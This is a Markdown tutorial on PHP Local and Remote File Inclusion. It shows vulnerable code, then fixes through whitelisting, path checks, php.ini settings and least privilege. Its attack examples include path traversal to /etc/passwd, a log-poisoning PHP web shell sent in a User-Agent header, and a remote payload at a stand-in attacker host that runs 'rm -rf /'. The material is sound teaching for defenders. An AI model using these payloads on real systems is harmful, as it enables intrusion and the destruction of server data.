<div align="center"> 
<h1>Table of Contents</h1>
</div>

- [**What is File Inclusion and why is it so dangerous?**](#what-is-file-inclusion-and-why-is-it-so-dangerous)
- [**The two types of File Inclusion: LFI and RFI**](#the-two-types-of-file-inclusion-lfi-and-rfi)
  - [**Local File Inclusion (LFI)**](#local-file-inclusion-lfi)
    - [**How an LFI vulnerability might look (PHP example)**](#how-an-lfi-vulnerability-might-look-php-example)
  - [**How an attacker exploits LFI:**](#how-an-attacker-exploits-lfi)
    - [**Example 1: Reading system files (e.g. Linux password file)**](#example-1-reading-system-files-eg-linux-password-file)
    - [**Example 2: Executing log files (Log Poisoning for RCE)**](#example-2-executing-log-files-log-poisoning-for-rce)
- [**Remote File Inclusion (RFI)**](#remote-file-inclusion-rfi)
  - [**How an RFI vulnerability might look (PHP example)**](#how-an-rfi-vulnerability-might-look-php-example)
  - [**How an attacker exploits RFI:**](#how-an-attacker-exploits-rfi)
- [**How to fix File Inclusion vulnerabilities?**](#how-to-fix-file-inclusion-vulnerabilities)
    - [**1. Always validate and filter input (the absolute foundation!)**](#1-always-validate-and-filter-input-the-absolute-foundation)
    - [**2. Configure server settings properly (especially important for RFI)**](#2-configure-server-settings-properly-especially-important-for-rfi)
    - [**3. Principle of least privilege**](#3-principle-of-least-privilege)
    - [**4. Regular security updates**](#4-regular-security-updates)
    - [**5. Web Application Firewall (WAF)**](#5-web-application-firewall-waf)

---

## **What is File Inclusion and why is it so dangerous?**

Imagine your website is like a restaurant. You have a menu (your website), and when a guest orders something (calls a URL), the kitchen (your web server) delivers the right dish (the requested file).

With a **File Inclusion vulnerability**, there’s a mistake in the kitchen: The chef (your web server script) blindly trusts the guest’s order and not only prepares dishes from the menu, but could also fetch ingredients from the storage that aren’t meant for the menu—or worse: try to get ingredients from a supplier not approved for the restaurant!

That’s exactly what happens with File Inclusion: A web application includes files in its script, whose paths or names it gets directly from **user input** (e.g. part of the URL), without properly checking that input.

**Why is this dangerous?** Because an attacker can exploit this lack of validation:

- **Data theft:** The attacker can read sensitive data on your server (e.g. usernames, passwords, config files).
- **Website manipulation:** They can change your website’s content or display unwanted messages.
- **Remote Code Execution (RCE):** The worst case. The attacker can **execute arbitrary code on your server**. This gives them full control over your website and potentially the entire server. They could install malware, delete your database, or use your server for further attacks.

---

## **The two types of File Inclusion: LFI and RFI**

There are two main types of this vulnerability, depending on where the included data comes from:

### **Local File Inclusion (LFI)**

With **LFI**, the attacker forces your web application to **load and execute a file that already exists on your own web server**. The attacker uses path traversal to break out of the web directory and access other areas of your server’s file system.

#### **How an LFI vulnerability might look (PHP example)**

> **Language:** PHP

```php
<?php
// page.php - VULNERABLE CODE FOR LFI
$section = $_GET['part']; // Gets the value of the 'part' parameter from the URL
include($section . '.html'); // Includes the file, e.g. 'about_us.html'
?>
```

A normal call would be `https://your-website.com/page.php?part=contact` (would load `contact.html`).

---

### **How an attacker exploits LFI:**

The attacker knows that `$_GET['part']` goes directly into the `include()` statement. They could try path manipulation:

#### **Example 1: Reading system files (e.g. Linux password file)**

- **Attacker URL:** `https://your-website.com/page.php?part=../../../../etc/passwd`
- **What happens internally:** Your web server tries to load the file `../../../../etc/passwd.html`.
  - The string `../` means "go up one directory".
  - By repeating it (`../../../..`), the attacker moves up the file system to the root directory.
  - From there, they try to access `/etc/passwd`.
- **Result:** If the server is misconfigured and the file is readable, its contents (usernames and other system info) are displayed in the attacker’s browser. Even if `.html` is appended, the text file’s contents are often still shown.

#### **Example 2: Executing log files (Log Poisoning for RCE)**

This is an advanced LFI technique that can lead to **Remote Code Execution (RCE)**.

1. **Attacker step: Inject code into a log file**
   1. Many web servers log requests in files (e.g. `/var/log/apache2/access.log`).
   2. The attacker sends a special HTTP request to your site, with **PHP code in a normally harmless field** (e.g. the **User-Agent** header):

        ```
        GET / HTTP/1.1
        User-Agent: <?php system($_GET['cmd']); ?> *(do not execute - for explanation only)*
        Host: your-website.com
        ```

        Or:

        ```
        GET / HTTP/1.1
        User-Agent: PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7 ?> *(do not execute - for explanation only)*
        Host: your-website.com
        ```

   3. Your web server writes this User-Agent string into its `access.log` file.

<br>

2. **Attacker step: Include the log file via LFI**
   1. **Attacker URL:** `https://your-website.com/page.php?part=../../../../var/log/apache2/access.log`
   2. **What happens internally:** Your web server tries to include the log file. Since the log file now contains the attacker’s injected PHP code and your app interprets it as PHP, the code is executed.
   3. **Result:** The attacker can now execute arbitrary commands on your server by adding another parameter (`cmd`) to the URL, e.g.: `http://your-website.com/page.php?part=../../../../var/log/apache2/access.log&cmd=ls%20-la` (shows a list of files in the current directory).

---

## **Remote File Inclusion (RFI)**

With **RFI**, the attacker forces your web application to **load a file from an external server that the attacker controls.** This is usually more dangerous than LFI, since the attacker can fully control the file’s contents.

**Requirement for RFI:** The PHP configuration on your server must have `allow_url_include = On`. Fortunately, this is `Off` by default in modern PHP versions, but older or misconfigured systems may be vulnerable.

### **How an RFI vulnerability might look (PHP example)**

Let’s take a similar but even more vulnerable script:

> **PHP**

```php
<?php
// load.php - VULNERABLE CODE FOR RFI
$resource = $_GET['source']; // Gets the value of the 'source' parameter
include($resource); // Includes the specified resource
?>
```
A normal call would be: `https://your-website.com/load.php?source=local_file.php`

---

### **How an attacker exploits RFI:**

1. **Attacker preparation:** The attacker creates a small file with malicious PHP code and hosts it on their own web server, e.g. at `https://attacker.com/my_malware.txt`: 

    >**PHP**

    ```php
    <?php
    echo "<h1>Your website has been hacked!</h1>";
    system("rm -rf /"); // Extremely dangerous command: deletes the entire file system!
    ?>
    ```

(The file extension doesn’t matter, since the victim application will interpret the content as PHP code.)

2. **Attack on your website:** The attacker calls your site with this URL:  <br> `https://your-website.com/load.php?source=https://attacker.com/my_malware.txt` 

- **What happens internally:**
  - The variable `$resource` gets the value  <br> `https://attacker.com/my_malware.txt`
  - The `include()` statement on your server loads the content of this external URL.
  - Since `allow_url_include` is `On`, your server interprets the downloaded content as PHP code and **executes it**.
- **Result:** The message *Your website has been hacked!* appears, and (in the worst case) the dangerous command `system("rm -rf /");` is executed, which could **wipe all server data**. **This is direct Remote Code Execution.**

---

## **How to fix File Inclusion vulnerabilities?**

The good news is these vulnerabilities are **preventable!** The golden rule of IT security: **Never trust user input!** Apply these principles consistently:

#### **1. Always validate and filter input (the absolute foundation!)**

This is the most important measure. Make sure every input you get from a user (via URLs, forms, or other sources) is exactly what you expect and contains nothing malicious.

- **A) Whitelisting (the safest method):**
  - Only allow an **explicitly defined list** of values. Reject everything else.
  - **Example for LFI protection:**

    > **PHP**

    ```php
    <?php
    // page.php - SECURE CODE WITH WHITELISTING
    $allowed_pages = ['home', 'contact', 'about_us', 'imprint'];
    $section = $_GET['part'];

    if (in_array($section, $allowed_pages)) {
        // Only if the value is in the allowed list, include the file
        include($section . '.html');
    } else {
        // Otherwise, show an error or redirect to a default page
        echo "Error: The requested page is not available.";
        // Or header("Location: /404.html");
    }
    ?>
    ```

    Here, the attacker can never inject `../../../../etc/passwd`, since that string isn’t in the `allowed_pages` list.

    <br>

  - **B) Path normalization and checking (for more complex cases):**  
    - If you can’t use a fixed whitelist (e.g. too many files), make sure user input doesn’t contain path traversal sequences (`../` or `..\`).
    - Use functions like `basename()` (removes path info, leaves only filename) or `realpath()` (resolves a path to its absolute, safe path).
    - **Example for LFI protection with `basename()`:**
    
        > **PHP**

        ```php
        <?php
        // file_load.php - SECURE CODE WITH BASENAME() AND EXPLICIT PATH
        $requested_name = $_GET['file'];

        // 1. Extract only the filename, remove all path info
        $safe_filename = basename($requested_name);

        // 2. Combine the safe filename with a fixed, known directory
        $full_path = '/var/www/html/content/' . $safe_filename . '.txt';

        // 3. Check if the file actually exists and is within the desired directory
        //    realpath() is useful to check if the path doesn’t lead elsewhere
        if (file_exists($full_path) && strpos(realpath($full_path), '/var/www/html/content/') === 0) {
            include($full_path);
        } else {
            echo "Error: Invalid file or access denied.";
        }
        ?>
        ```

        `strpos(realpath(...), ...)` ensures the resolved path really starts with your desired base directory and doesn’t "break out".

#### **2. Configure server settings properly (especially important for RFI)**

Your PHP configuration is a stronghold against RFI.

- `allow_url_include = Off` **(PHP setting):**
  - **This is the most important protection against RFI.** Make sure in your `php.ini` (the PHP config file) this value is set to `Off`. <br><br>
  
    ```ini
    ; In your php.ini
    allow_url_include = Off
    ```

  - This setting forbids PHP from loading files from external URLs via `include()` or `require()`.
  - **Check this immediately!** If it’s `On`, you’re extremely vulnerable. After changing `php.ini`, restart your web server (Apache, Nginx) for changes to take effect.
  - `allow_url_fopen = OFF` **(Optional, but recommended):**
    - This setting controls whether PHP can open files via URL protocols (`http://`, `ftp://`) (not necessarily include, but read).
    - If your app doesn’t need to open remote files via URLs, set this to `Off` to close another attack surface.


#### **3. Principle of least privilege**

- Make sure the user your web server processes run as (often `www-data` or `apache`) has only the minimum necessary permissions.
- They should **not have read access** to sensitive system files like `/etc/passwd`, `/etc/shadow`, or database config files not needed for the website.
- Write permissions should be restricted to the absolute minimum (e.g. upload folders, but not the entire webroot).

#### **4. Regular security updates**
- Keep your **operating system**, **web server** (Apache, Nginx, IIS), and **scripting language** (PHP, Python, Node.js) up to date. Updates often contain important security patches for known vulnerabilities.

#### **5. Web Application Firewall (WAF)**

- A WAF is a shield for your web application that can detect and block malicious requests before they reach your app. Many WAFs have rules that detect typical File Inclusion attacks (e.g. with `../` or `http://`).

---

![img](https://storage.googleapis.com/github-storage-daonware/Cybersecurity/statistic-exploit.png)

By carefully applying these measures, you can greatly improve your website’s security and protect yourself from potentially devastating File Inclusion attacks. The key is to be suspicious of everything coming from outside and only allow what